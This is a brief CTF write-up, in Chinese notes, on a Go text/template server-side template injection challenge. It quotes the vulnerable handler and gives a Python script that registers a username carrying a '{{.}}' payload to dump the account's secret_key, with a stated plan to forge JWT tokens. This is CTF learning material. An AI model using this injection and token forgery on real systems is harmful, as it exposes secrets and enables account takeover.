tags:: CTFWEB/SSTI/Golang_text_template, CTFWEB/Golang

- # 思路
	- 打root_handler的SSTI拿到secret_key，然后伪造JWT token
- # SSTI
	- 看到
		- secret_key在每一个Account struct中，只需要打印出这个struct就能拿到
		- root_handler中存在SSTI
			- ```go
			  id, _ := jwt_decode(token)
			  acc := get_account(id)
			  tpl, err := template.New("").Parse("Logged in as " + acc.id)
			  if err != nil {
			  }
			  tpl.Execute(w, &acc)
			  ```
	- 干
		- ```python
		  username = fake_en_name() + ": {{.}}"
		  r = base_post(url + "/regist", data = {
		      "id": username,
		      "pw": "114514"
		  })
		  r = base_post(url + "/auth", data = {
		      "id": username,
		      "pw": "114514"
		  })
		  token = r.json()["token"]
		  r = base_post(url + "/", headers = {
		      "X-Token": token
		  })
		  print(r.text)
		  ```
-